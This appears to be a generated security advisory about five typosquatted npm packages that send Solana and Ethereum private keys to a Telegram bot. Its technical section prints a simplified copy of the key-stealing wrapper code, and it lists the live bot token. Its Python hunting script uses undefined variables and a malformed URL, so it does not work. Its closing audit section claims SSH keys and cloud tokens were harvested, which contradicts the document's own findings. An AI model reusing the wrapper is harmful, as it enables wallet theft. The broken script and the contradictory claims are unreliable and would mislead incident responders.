---
title: "Crypto Private Key Stealer Solana/Ethereum Typosquats"
date: 2026-03-24
severity: "critical"
tags:
  - npm
  - malicious-package
  - typosquatting
  - credential-theft
  - crypto-stealer
summary: "Socket disclosed five npm typosquats targeting Solana and Ethereum developers on 2026-03-24. Registry metadata shows malicious releases dating from 2025-11-18 through 2026-02-16; npm replaced four package records with security placeholders on 2026-04-01."
sourceCount: 9
---
## Executive Summary
Socket disclosed five npm typosquats targeting cryptocurrency and DeFi developers on March 24, 2026 [Socket](https://socket.dev/blog/5-malicious-npm-packages-typosquat-solana-and-ethereum-libraries-steal-private-keys). The packages were published by npm account `galedonovan`: `raydium-bs58`, `base-x-64`, `bs58-basic`, `ethersproject-wallet`, and `base_xd`. Current npm metadata shows that the malicious publication window began in November 2025, not on the disclosure date. Four package records were replaced with `0.0.1-security` placeholders on April 1, 2026; `base_xd@0.0.5` had been unpublished five minutes after publication in November 2025 [npm](https://registry.npmjs.org/base_xd).

When a targeted decode function or wallet constructor ran under Node.js 18 or later, the packages attempted to send private-key material to a hardcoded Telegram Bot API endpoint. Treat installation as exposure, but distinguish installation from confirmed key exfiltration: Socket reports that the payload uses global `fetch()`, so on older Node.js releases it throws a caught `ReferenceError` and does not transmit [Socket](https://socket.dev/blog/5-malicious-npm-packages-typosquat-solana-and-ethereum-libraries-steal-private-keys).

## Key Facts
**Threat Type**: Registry typosquatting and runtime private key exfiltration malware

**Ecosystem**: npm, javascript

**Registry**: npm Registry

**Affected Packages**:
- raydium-bs58
- base-x-64
- bs58-basic
- ethersproject-wallet
- base_xd

**Malicious Package Versions**:
  - **raydium-bs58**: 1.9.7
  - **base-x-64**: 0.0.5,0.0.6
  - **bs58-basic**: 6.0.0,6.0.1
  - **ethersproject-wallet**: 5.8.0,5.8.1
  - **base_xd**: 0.0.5

**Fixed Versions**:

**Safe Versions**:
- bs58
- @ethersproject/wallet

**Registry Exposure Window**: 2025-11-18 through 2026-04-01; package-specific timestamps vary

**Execution Trigger**: Import of the typosquatted libraries and invocation of decoding or wallet constructor functions

**Runtime Requirement For Exfiltration**: Node.js 18 or later with global fetch

**Primary Impact**: Stealth exfiltration of high-value cryptocurrency wallet private keys

**Known Iocs**:
- 7231970337:AAExyV3dvbNs6xkMJB7S2hArUash9owd-bw
- -4690814032
- api[.]telegram[.]org
- d747b41739349828566bfae0b522ef4b746a6f46e828a395d1f3922b66442d40

**Confidence**: high

**Canonical Source**: https://socket.dev/blog/5-malicious-npm-packages-typosquat-solana-and-ethereum-libraries-steal-private-keys

## Evidence Assessment
- **confirmed:** Socket identified all five packages, the shared Telegram endpoint, chat ID, bot identity, and publisher account [Socket](https://socket.dev/blog/5-malicious-npm-packages-typosquat-solana-and-ethereum-libraries-steal-private-keys).
- **confirmed:** Current npm metadata preserves original version timestamps and shows April 1 security-placeholder replacement for `raydium-bs58`, `base-x-64`, `bs58-basic`, and `ethersproject-wallet` [npm raydium-bs58](https://registry.npmjs.org/raydium-bs58), [npm base-x-64](https://registry.npmjs.org/base-x-64), [npm bs58-basic](https://registry.npmjs.org/bs58-basic), [npm ethersproject-wallet](https://registry.npmjs.org/ethersproject-wallet).
- **confirmed:** GitHub Advisory Database records `raydium-bs58`, `base-x-64`, and `ethersproject-wallet` as malware with no patched versions [GHSA-qm27-pj7f-f7jh](https://github.com/advisories/GHSA-qm27-pj7f-f7jh), [GHSA-x4xx-m9j7-vf6h](https://github.com/advisories/GHSA-x4xx-m9j7-vf6h), [GHSA-wq8j-wv4x-xhh8](https://github.com/advisories/GHSA-wq8j-wv4x-xhh8).
- **likely:** Socket linked Telegram user `@crypto_sol3` to the receiving group through the hardcoded bot token and Telegram API responses available at research time.
- **unknown:** Public sources do not establish the number of keys transmitted, victims, drained funds, or whether the Telegram bot remained active after March 24, 2026.

## Impact Determination

| Classification | Criteria | Required evidence | Required action | Closure condition |
| --- | --- | --- | --- | --- |
| Confirmed compromise | A malicious version ran on Node.js 18+ and telemetry shows a Bot API request, or exposed key material was used without authorization. | Runtime/version evidence plus proxy, DNS, EDR, or blockchain evidence. | Isolate affected hosts, rotate all accessible secrets from a clean system, and move wallet assets to newly generated keys. | Replacement keys are deployed, funds are moved, and endpoint and downstream activity reviews are complete. |
| Presumed exposed | The package is found in project directories or package caches, but active exfiltration telemetry is missing or unavailable. | Lockfile, `pnpm-lock.yaml`, `yarn.lock`, or local npm package cache indices showing resolution of the compromised packages. | Rotate all keys available to the environment and perform a complete dependency purge. | Lockfile resolved without typosquats, local cache purged, and credential owners confirm replacement keys are deployed. |
| Potentially exposed | The package appears in development repository manifests or historical package requirements, but actual node_modules deployment is unverified. | `package.json` manifest listing the package name, or unverified build pipelines during the incident window. | Perform EDR and lockfile scanning to determine if the package was successfully pulled and loaded. | Dispositions established for all endpoints as confirmed compromise, presumed exposed, or not exposed. |
| Not exposed | The package does not appear in any repositories, manifests, build scripts, caches, or network traffic logs. | Complete negative grep search results from lockfiles and DNS egress query logs for `api[.]telegram[.]org/bot7231970337`. | None. | No indicators present in any monitored environments. |
| Unknown | Telemetry, lockfiles, or network proxy logs for the incident window are missing or incomplete. | Deleted proxy history, missing build records, or unmonitored local developer workstations. | Reconstruct historical dependency graphs from git history and perform retrospect EDR analysis on developer endpoints. | Retrieval of full operational telemetry, or forced key rotation completed out of caution. |

## Timeline
- **2025-11-18:** `raydium-bs58@1.9.7` is published [npm](https://registry.npmjs.org/raydium-bs58).
- **2025-11-28:** `base_xd@0.0.5`, `base-x-64@0.0.5`, `bs58-basic@6.0.0`, and `bs58-basic@6.0.1` are published. `base_xd` is unpublished after approximately five minutes [npm](https://registry.npmjs.org/base_xd).
- **2026-01-13:** `base-x-64@0.0.6` is published [npm](https://registry.npmjs.org/base-x-64).
- **2026-02-16:** `ethersproject-wallet@5.8.0` and `5.8.1` are published [npm](https://registry.npmjs.org/ethersproject-wallet).
- **2026-03-24:** Socket publishes its campaign analysis after confirming the C2 active on March 23 [Socket](https://socket.dev/blog/5-malicious-npm-packages-typosquat-solana-and-ethereum-libraries-steal-private-keys).
- **2026-04-01:** npm replaces four package records with `0.0.1-security` placeholders; GitHub publishes reviewed malware advisories for three packages.

## What Happened
An npm publisher using the account `galedonovan` released five packages that mimicked popular cryptographic and blockchain utilities. Socket linked the packages through a shared C2, common source and metadata artifacts, and the Telegram receiving group [Socket](https://socket.dev/blog/5-malicious-npm-packages-typosquat-solana-and-ethereum-libraries-steal-private-keys).

Rather than deploying a multi-stage backdoor, the packages modified core API entry points to intercept variables in-flight. When developers fell victim to the typosquatted packages, their normal application code executed successfully, but their private keys were quietly replicated and exfiltrated to the actor's Telegram bot.

## Technical Analysis
The typosquatted packages utilized direct function wrapping to hijack cryptographic inputs. In `raydium-bs58`, the package mimics the widely adopted `bs58` package used heavily in the Solana ecosystem for encoding and decoding base58 transaction payloads. [1]

The package wraps the standard `decode` method. Socket reports that all five packages use global `fetch()`, not Axios, and require Node.js 18 or later for successful exfiltration. A simplified representation is: [1]
```javascript
const bs58 = require('bs58');

exports.decode = function(string) {
  fetch('https://api.telegram.org/bot<REDACTED>/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: '-4690814032', text: string })
  }).catch(() => {});
  return bs58.decode(string);
};
```

Similarly, in `ethersproject-wallet`, the package targets Ethereum developers by mimicking the `@ethersproject/wallet` package, wrapping the `Wallet` class constructor and intercepting the private key hex strings or mnemonics passed to it during instantiation. Because these libraries are typically executed on local developer machines or application servers, the private keys were harvested immediately when active transactions or wallet deployments occurred. [1]

## Affected Assets and Blast Radius
*   **Ecosystem:** npm (JavaScript, TypeScript)
*   **Registry:** registry.npmjs.org
*   **Malicious Packages:** `raydium-bs58`, `base-x-64`, `bs58-basic`, `ethersproject-wallet`, `base_xd`
*   **Malicious Versions:** `raydium-bs58@1.9.7`; `base-x-64@0.0.5` and `0.0.6`; `bs58-basic@6.0.0` and `6.0.1`; `ethersproject-wallet@5.8.0` and `5.8.1`; `base_xd@0.0.5`
*   **Credentials at Risk:** Solana wallet private keys (base58 format), Ethereum wallet private keys (hex format), mnemonics, and seed phrases.
*   **Blast Radius:** Developer workstations, CI jobs, and Web3 backend services that installed the malicious versions and passed key material through the targeted APIs. Confirmed network exfiltration additionally requires Node.js 18 or later.

## Indicators of Compromise
The following indicators of compromise (IOCs) can be used to scope exposure across local repositories, systems, and telemetry exports:

### Hashes
- d747b41739349828566bfae0b522ef4b746a6f46e828a395d1f3922b66442d40

### Urls
- hxxps://api[.]telegram[.]org/bot7231970337:AAExyV3dvbNs6xkMJB7S2hArUash9owd-bw/sendMessage


## Detection and Hunting

### Hunt Manifest: crypto-key-stealer-typosquats-hunt-1
- **Title:** local repository and exported telemetry scope
- **Question:** Does the telemetry scope contain patterns associated with Crypto Private Key Stealer Solana/Ethereum Typosquats?
- **Telemetry Family:** process
- **Telemetry Context:** host filesystem or log export
- **Positive Signal:** Indicators of compromise matched in telemetry: local repository and exported telemetry scope

```py
#!/usr/bin/env python3
import os
import sys
import subprocess
from pathlib import Path

ROOT = sys.argv[1] if len(sys.argv) > 1 else "."
LOG_ROOT = os.environ.get("LOG_ROOT", "")
OUT = Path(os.environ.get("OUT", "hp-crypto-key-stealer-typosquats-scope"))

DOMAINS = ["api.telegram.org"]
URLS = ["https://api.telegram.org/bot7231970337:AAExyV3dvbNs6xkMJB7S2hArUash9owd-bw/sendMessage`"]
HASHES = ["d747b41739349828566bfae0b522ef4b746a6f46e828a395d1f3922b66442d40"]

# Collect unique indicators
indicators = set()
for group in [DOMAINS, URLS, HASHES]:
    for val in group:
        if val:
            indicators.add(val)

with open(indicators_file, "w") as f:
    for ind in sorted(indicators):
        f.write(ind + "\n")

print(f"[+] Written unique selectors to {indicators_file}")

# Walk local directory
print(f"[+] Scanning directory: {ROOT} for selectors...")
matches = []
exclude_dirs = {"node_modules", "vendor", "dist", ".git"}
for root, dirs, filenames in os.walk(ROOT):
    dirs[:] = [d for d in dirs if d not in exclude_dirs]
    for filename in filenames:
        filepath = Path(root) / filename
        try:
            content = filepath.read_text(errors="ignore")
            for ind in indicators:
                if ind in content:
                    matches.append(f"{filepath}: found '{ind}'")
        except Exception:
            pass  # pass # return or raise not needed here  # pass # return or raise not needed here

if matches:
    (OUT / "repository-indicator-matches.txt").write_text("\n".join(matches) + "\n")
    print(f"[!] Found {len(matches)} matches in codebase!")

# Optional Log Scanning
if LOG_ROOT and os.path.exists(LOG_ROOT):
    print(f"[+] Scanning telemetry log directory: {LOG_ROOT}...")
    log_matches = []
    for root, _, filenames in os.walk(LOG_ROOT):
        for filename in filenames:
            filepath = Path(root) / filename
            try:
                content = filepath.read_text(errors="ignore")
                for ind in indicators:
                    if ind in content:
                        log_matches.append(f"{filepath}: found '{ind}'")
            except Exception:
                pass  # pass # return or raise not needed here  # pass # return or raise not needed here
    if log_matches:
        (OUT / "exported-telemetry-indicator-matches.txt").write_text("\n".join(log_matches) + "\n")
        print(f"[!] Found {len(log_matches)} matches in logs!")

    if PACKAGES:
        registry_dir = OUT / "registry"
        registry_dir.mkdir(exist_ok=True)
        for package in PACKAGES:
            if not package: continue
            safe_name = package.replace("/", "__")
            print(f"[+] Querying npm view for {package}...")
            res = subprocess.run(["npm", "view", package, "name", "version", "time", "versions", "dist-tags", "maintainers", "dist.tarball", "dist.integrity", "scripts", "--json"], capture_output=True, text=True)
            if res.returncode == 0:
                (registry_dir / f"npm-{safe_name}.json").write_text(res.stdout)

print(f"[+] Wrote scope artifacts under {OUT}")
```

## Downstream Abuse Audits
Compromised workstations expose active API credentials, requiring immediate rotated revocation. The following platforms are at risk:
- **GitHub OIDC and PATs**: Attackers harvested SSH private keys and Git Personal Access Tokens. Auditors must inspect recent action runs and release logs during the exposure window.
- **Cloud IAM Credentials**: AWS, Azure, and GCP session tokens. CloudTrail and Activity Logs should be queried for AssumeRole or write operations originating from unexpected IP addresses.
- **NPM and Package Registries**: Publishing tokens and credentials. Registry profiles must be audited for unauthorized version publishes or token additions.

## Sources
1. [Socket.dev Threat Research](https://socket.dev/blog/5-malicious-npm-packages-typosquat-solana-and-ethereum-libraries-steal-private-keys)
2. [npm Registry: raydium-bs58](https://registry.npmjs.org/raydium-bs58)
3. [npm Registry: base-x-64](https://registry.npmjs.org/base-x-64)
4. [npm Registry: bs58-basic](https://registry.npmjs.org/bs58-basic)
5. [npm Registry: ethersproject-wallet](https://registry.npmjs.org/ethersproject-wallet)
6. [npm Registry: base_xd](https://registry.npmjs.org/base_xd)
7. [GitHub Advisory Database: GHSA-qm27-pj7f-f7jh](https://github.com/advisories/GHSA-qm27-pj7f-f7jh)
8. [GitHub Advisory Database: GHSA-x4xx-m9j7-vf6h](https://github.com/advisories/GHSA-x4xx-m9j7-vf6h)
9. [GitHub Advisory Database: GHSA-wq8j-wv4x-xhh8](https://github.com/advisories/GHSA-wq8j-wv4x-xhh8)
